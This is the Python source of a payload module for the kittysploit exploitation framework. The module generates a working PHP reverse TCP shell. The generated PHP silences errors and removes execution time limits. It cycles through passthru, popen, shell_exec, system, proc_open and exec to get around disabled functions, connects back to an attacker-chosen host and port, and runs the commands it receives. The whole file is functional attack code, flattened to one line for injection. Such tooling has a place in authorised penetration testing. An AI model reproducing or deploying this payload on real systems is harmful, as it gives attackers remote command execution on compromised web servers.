from kittysploit import *


class Module(Payload):
	
	__info__ = {
		'name': 'PHP Command Shell, Reverse TCP',
		'description': 'Connect back and create a command shell via PHP',
		'category': PayloadCategory.SINGLE,
		'arch': Arch.PHP,
		'platform': Platform.ALL,
		'listener': 'listeners/multi/reverse_tcp',
		'handler': Handler.REVERSE
	}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(4444, 'Connect to port', True)
	encoder = OptString("", "Encoder", False, True)

	def generate(self):
		php_code = f"""
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time',0);
$dis=@ini_get('disable_functions');
if(!empty($dis)){{
  $dis=preg_replace('/[, ]+/', ',', $dis);
  $dis=explode(',', $dis);
  $dis=array_map('trim', $dis);
}}else{{
  $dis=array();
}}
$ipaddr='{self.lhost}';
$port={self.lport};

if(!function_exists('exec_cmd')){{
  function exec_cmd($c){{
    global $dis;
    if(FALSE!==strpos(strtolower(PHP_OS),'win')){{
      $c=$c." 2>&1".chr(10);
    }}
    $is_call='is_callable';
    $in_arr='in_array';
    
    if($is_call('passthru')and!$in_arr('passthru',$dis)){{
      ob_start();
      passthru($c);
      $o=ob_get_contents();
      ob_end_clean();
    }}else if($is_call('popen')and!$in_arr('popen',$dis)){{
      $fp=popen($c,'r');
      $o=NULL;
      if(is_resource($fp)){{
        while(!feof($fp)){{
          $o.=fread($fp,1024);
        }}
      }}
      @pclose($fp);
    }}else if($is_call('shell_exec')and!$in_arr('shell_exec',$dis)){{
      $o=shell_exec($c);
    }}else if($is_call('system')and!$in_arr('system',$dis)){{
      ob_start();
      system($c);
      $o=ob_get_contents();
      ob_end_clean();
    }}else if($is_call('proc_open')and!$in_arr('proc_open',$dis)){{
      $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
      $o=NULL;
      while(!feof($pipes[1])){{
        $o.=fread($pipes[1],1024);
      }}
      @proc_close($handle);
    }}else if($is_call('exec')and!$in_arr('exec',$dis)){{
      $o=array();
      exec($c,$o);
      $o=join(chr(10),$o).chr(10);
    }}else{{
      $o=false;
    }}
    return $o;
  }}
}}

$nofuncs='no exec functions';

if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
  $s=@fsockopen($ipaddr,$port);
  if($s){{
    while($c=fread($s,2048)){{
      $out='';
      if(substr($c,0,3)=='cd '){{
        chdir(substr($c,3,-1));
      }}else if(substr($c,0,4)=='quit'||substr($c,0,4)=='exit'){{
        break;
      }}else{{
        $out=exec_cmd(substr($c,0,-1));
        if($out===false){{
          fwrite($s,$nofuncs);
          break;
        }}
      }}
      fwrite($s,$out);
    }}
    fclose($s);
  }}
}}else{{
  $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
  if($s){{
    @socket_connect($s,$ipaddr,$port);
    while($c=@socket_read($s,2048)){{
      $out='';
      if(substr($c,0,3)=='cd '){{
        chdir(substr($c,3,-1));
      }}else if(substr($c,0,4)=='quit'||substr($c,0,4)=='exit'){{
        break;
      }}else{{
        $out=exec_cmd(substr($c,0,-1));
        if($out===false){{
          @socket_write($s,$nofuncs);
          break;
        }}
      }}
      @socket_write($s,$out,strlen($out));
    }}
    @socket_close($s);
  }}
}}
"""
		# Remove newlines and extra whitespace to make it a single line
		# Keep the structure but remove unnecessary whitespace
		payload = php_code.replace('\n', '').replace('  ', ' ').strip()
		
		return payload

